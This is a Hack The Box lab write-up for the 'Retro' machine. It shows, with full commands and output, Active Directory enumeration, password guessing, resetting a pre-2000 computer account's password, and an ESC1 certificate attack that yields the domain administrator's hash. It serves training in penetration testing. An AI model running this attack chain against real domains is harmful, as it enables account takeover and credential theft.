+++
tags = ["hackthebox", "easy", "pre2k", "esc1", "windows", "activedirectory"]
difficulty = "easy"
date = "2025-07-12"
description = "Retro Writeup"
linktitle = ""
title = "[EASY] Retro"
slug = "retro"
type = "post"
+++

[Link to the room!](https://app.hackthebox.com/machines/Retro)

## Enumeration

### Nmap

Start by running the usual Nmap scan:

```bash
❯ nmap -T5 -sCV -Pn -n 10.129.234.44
```

```txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-12 01:33 CEST

Nmap scan report for 10.129.234.44
Host is up (0.083s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-11 15:33:32Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RETRO
|   NetBIOS_Domain_Name: RETRO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: retro.vl
|   DNS_Computer_Name: DC.retro.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-07-11T15:34:16+00:00
| ssl-cert: Subject: commonName=DC.retro.vl
| Not valid before: 2025-04-08T01:55:44
|_Not valid after:  2025-10-08T01:55:44
|_ssl-date: 2025-07-11T15:34:57+00:00; -8h00m01s from scanner time.
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: -8h00m00s, deviation: 0s, median: -8h00m01s
| smb2-time: 
|   date: 2025-07-11T15:34:21
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.25 seconds
```

### Enum4linux-ng

Also run enum4linux-ng:

```bash
❯ enum4linux-ng 10.129.234.44
```

```txt
ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.129.234.44
[*] Username ......... ''
[*] Random Username .. 'iwlikksy'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ======================================
|    Listener Scan on 10.129.234.44    |
 ======================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =====================================================
|    Domain Information via LDAP for 10.129.234.44    |
 =====================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: retro.vl

 ============================================================
|    NetBIOS Names and Workgroup/Domain for 10.129.234.44    |
 ============================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 ==========================================
|    SMB Dialect Check on 10.129.234.44    |
 ==========================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: true

 ============================================================
|    Domain Information via SMB session for 10.129.234.44    |
 ============================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: DC
NetBIOS domain name: RETRO
DNS domain: retro.vl
FQDN: DC.retro.vl
Derived membership: domain member
Derived domain: RETRO

 ==========================================
|    RPC Session Check on 10.129.234.44    |
 ==========================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[+] Server allows session using username 'iwlikksy', password ''
[H] Rerunning enumeration with user 'iwlikksy' might give more results

 ====================================================
|    Domain Information via RPC for 10.129.234.44    |
 ====================================================
[+] Domain: RETRO
[+] Domain SID: S-1-5-21-2983547755-698260136-4283918172
[+] Membership: domain member

 ================================================
|    OS Information via RPC for 10.129.234.44    |
 ================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[-] Could not get OS info via 'srvinfo': STATUS_ACCESS_DENIED
[+] After merging OS information we have the following result:
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: ''
OS build: '20348'
Native OS: not supported
Native LAN manager: not supported
Platform id: null
Server type: null
Server type string: null

 ======================================
|    Users via RPC on 10.129.234.44    |
 ======================================
[*] Enumerating users via 'querydispinfo'
[-] Could not find users via 'querydispinfo': STATUS_ACCESS_DENIED
[*] Enumerating users via 'enumdomusers'
[-] Could not find users via 'enumdomusers': STATUS_ACCESS_DENIED

 =======================================
|    Groups via RPC on 10.129.234.44    |
 =======================================
[*] Enumerating local groups
[-] Could not get groups via 'enumalsgroups domain': STATUS_ACCESS_DENIED
[*] Enumerating builtin groups
[-] Could not get groups via 'enumalsgroups builtin': STATUS_ACCESS_DENIED
[*] Enumerating domain groups
[-] Could not get groups via 'enumdomgroups': STATUS_ACCESS_DENIED

 =======================================
|    Shares via RPC on 10.129.234.44    |
 =======================================
[*] Enumerating shares
[+] Found 0 share(s) for user '' with password '', try a different user

 ==========================================
|    Policies via RPC for 10.129.234.44    |
 ==========================================
[*] Trying port 445/tcp
[-] SMB connection error on port 445/tcp: STATUS_ACCESS_DENIED
[*] Trying port 139/tcp
[-] SMB connection error on port 139/tcp: session failed

 ==========================================
|    Printers via RPC for 10.129.234.44    |
 ==========================================
[-] Could not get printer info via 'enumprinters': STATUS_ACCESS_DENIED

Completed after 20.45 seconds
```

As you can see from the scans, the domain name is retro.vl and the DC's FQDN is dc.retro.vl, so you can add that to your hosts file and krb5.conf.


### Access to Guest user

Some manual enumeration will also reveal that the Guest user is actually available and can be used to list shares via netexec:

```bash
❯ netexec smb dc.retro.vl -u 'Guest' -p '' --shares
```

```txt
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.44   445    DC               [+] retro.vl\Guest: 
SMB         10.129.234.44   445    DC               [*] Enumerated shares
SMB         10.129.234.44   445    DC               Share           Permissions     Remark
SMB         10.129.234.44   445    DC               -----           -----------     ------
SMB         10.129.234.44   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.44   445    DC               C$                              Default share
SMB         10.129.234.44   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.44   445    DC               NETLOGON                        Logon server share 
SMB         10.129.234.44   445    DC               Notes                           
SMB         10.129.234.44   445    DC               SYSVOL                          Logon server share 
SMB         10.129.234.44   445    DC               Trainees        READ    
```

### Important.txt

Using the guest account, you can access the Trainees share and read the following file:

Important.txt
```txt
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admins
```


### RID-Bruteforcing

We can't quite enumerate users with the Guest account, but we can try to bruteforce RIDs...

```bash
❯ netexec smb dc.retro.vl -u 'Guest' -p '' --rid-brute
```

```txt
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.44   445    DC               [+] retro.vl\Guest: 
SMB         10.129.234.44   445    DC               498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               500: RETRO\Administrator (SidTypeUser)
SMB         10.129.234.44   445    DC               501: RETRO\Guest (SidTypeUser)
SMB         10.129.234.44   445    DC               502: RETRO\krbtgt (SidTypeUser)
SMB         10.129.234.44   445    DC               512: RETRO\Domain Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               513: RETRO\Domain Users (SidTypeGroup)
SMB         10.129.234.44   445    DC               514: RETRO\Domain Guests (SidTypeGroup)
SMB         10.129.234.44   445    DC               515: RETRO\Domain Computers (SidTypeGroup)
SMB         10.129.234.44   445    DC               516: RETRO\Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               517: RETRO\Cert Publishers (SidTypeAlias)
SMB         10.129.234.44   445    DC               518: RETRO\Schema Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               519: RETRO\Enterprise Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               520: RETRO\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.234.44   445    DC               521: RETRO\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               525: RETRO\Protected Users (SidTypeGroup)
SMB         10.129.234.44   445    DC               526: RETRO\Key Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               527: RETRO\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               553: RETRO\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.234.44   445    DC               571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.44   445    DC               572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.44   445    DC               1000: RETRO\DC$ (SidTypeUser)
SMB         10.129.234.44   445    DC               1101: RETRO\DnsAdmins (SidTypeAlias)
SMB         10.129.234.44   445    DC               1102: RETRO\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.234.44   445    DC               1104: RETRO\trainee (SidTypeUser)
SMB         10.129.234.44   445    DC               1106: RETRO\BANKING$ (SidTypeUser)
SMB         10.129.234.44   445    DC               1107: RETRO\jburley (SidTypeUser)
SMB         10.129.234.44   445    DC               1108: RETRO\HelpDesk (SidTypeGroup)
SMB         10.129.234.44   445    DC               1109: RETRO\tblack (SidTypeUser)
```


### Access as trainee

From the Important.txt message, we can infer that the password to RETRO\trainee could be trainee, and so it is:

```bash
❯ netexec smb dc.retro.vl -u 'trainee' -p 'trainee' --shares
```

```txt
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.44   445    DC               [+] retro.vl\trainee:trainee 
SMB         10.129.234.44   445    DC               [*] Enumerated shares
SMB         10.129.234.44   445    DC               Share           Permissions     Remark
SMB         10.129.234.44   445    DC               -----           -----------     ------
SMB         10.129.234.44   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.44   445    DC               C$                              Default share
SMB         10.129.234.44   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.44   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.234.44   445    DC               Notes           READ            
SMB         10.129.234.44   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.234.44   445    DC               Trainees        READ     
```

### Notes share

Accessing the notes share we can see two files:

```txt
# use Notes
# ls
drw-rw-rw-          0  Wed Apr  9 05:12:49 2025 .
drw-rw-rw-          0  Wed Jun 11 16:17:10 2025 ..
-rw-rw-rw-        248  Mon Jul 24 00:05:56 2023 ToDo.txt
-rw-rw-rw-         32  Wed Apr  9 05:13:01 2025 user.txt
```

ToDo.txt:
```txt
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James
```

And the other one is the user flag! (Yes, we got the user flag just by enumerating!!)

## Exploitaiton

### Pre-2000 Computers - Weak AD Computer Passwords

In ToDo.txt, Thomas talks about an apparently ancient pre-created computer account. From our RID bruteforcing we know he's referring to banking$. He says the account is older than him, so we might have ourselves a Pre-2000 Windows Computer.

You must know that for theses computers, their password is their lowercase SamAccountName minus the dollar sign (banking$: banking).

To check, we can try to authenticate via SMB and if returns STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT, then it's vulnerable.

```bash
❯ netexec smb  dc.retro.vl -u 'banking$' -p 'banking'
```

```txt
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.44   445    DC               [-] retro.vl\banking$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT 
```

Now, if we change the password, we'll be able to use the account as normal:

[More info about PRE-2K and Weak AD Computer Passwords here!](https://medium.com/@offsecdeer/finding-weak-ad-computer-passwords-e3dc1ed220df)

```bash
❯ impacket-changepasswd 'retro.vl/banking$@dc.retro.vl' -p rpc-samr -newpass abc123..
```

```txt
Impacket v0.13.0.dev0+20250701.160936.2e87ade - Copyright Fortra, LLC and its affiliated companies 

Current password: 
[*] Changing the password of retro.vl\banking$
[*] Connecting to DCE/RPC as retro.vl\banking$
[*] Password was changed successfully.
```

```
❯ netexec smb  dc.retro.vl -u 'banking$' -p 'abc123..'
```

```txt
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False) 
SMB         10.129.234.44   445    DC               [+] retro.vl\banking$:abc123..
```

Cool! Now we can freely use the banking$ computer account.

### ADCS Enumeration

A bit of manual enumeration whether via Bloodhound or Certipy will prove that ADCS is enabled. We can enumerate it with Certipy:

```bash
❯ certipy find -u trainee@retro.vl -p trainee -stdout -vulnerable
```

```txt
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: RETRO.VL.
[!] Use -debug to print a stacktrace
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[!] DNS resolution failed: The DNS query name does not exist: DC.retro.vl.
[!] Use -debug to print a stacktrace
[*] Retrieving CA configuration for 'retro-DC-CA' via RRP
[*] Successfully retrieved CA configuration for 'retro-DC-CA'
[*] Checking web enrollment for CA 'retro-DC-CA' @ 'DC.retro.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : retro-DC-CA
    DNS Name                            : DC.retro.vl
    Certificate Subject                 : CN=retro-DC-CA, DC=retro, DC=vl
    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85
    Certificate Validity Start          : 2023-07-23 21:03:51+00:00
    Certificate Validity End            : 2028-07-23 21:13:50+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : RETRO.VL\Administrators
      Access Rights
        ManageCa                        : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        ManageCertificates              : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Enroll                          : RETRO.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : RetroClients
    Display Name                        : Retro Clients
    Certificate Authorities             : retro-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Template Created                    : 2023-07-23T21:17:47+00:00
    Template Last Modified              : 2023-07-23T21:18:39+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : RETRO.VL\Administrator
        Full Control Principals         : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Owner Principals          : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Dacl Principals           : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Property Enroll           : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
    [+] User Enrollable Principals      : RETRO.VL\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

### RetroClients - ESC1

Certipy alerts us that the RetroClients template is vulnerable to ESC1, meaning that an enrollee can supply a subjectAltName (SAN) for any user or machine in the AD environment, allowing the enrollee to get a certificate and authenticate as the SAN supplied.

Furthermore, members from the Domain Computers group can enroll to the RetroClients template, so we can use the banking$ account to request a certificate for the administrator account:

```bash
❯ certipy req -u 'banking$@retro.vl' -p 'abc123..' -ca 'retro-DC-CA' -template 'RetroClients' -upn 'administrator@retro.vl' -dc-ip 10.129.234.44 -target 10.129.234.44 -sid S-1-5-21-2983547755-698260136-4283918172-500 -key-size 4096
```

```txt
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 26
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@retro.vl'
[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

**NOTE: for default public key sizes, Certipy will fail (CERTSRV_E_KEY_LENGTH), which is why you must use -key-size 4096**

Now, we can authenticate as the administrator account:

```bash
❯ certipy auth -username  administrator -domain retro.vl -pfx administrator.pfx -dc-ip 10.129.234.44
```

```txt
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@retro.vl'
[*]     SAN URL SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*]     Security Extension SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Using principal: 'administrator@retro.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:xxxxxxxxxxx
```

Now you can get the flag, as we have fully compromised the domain!!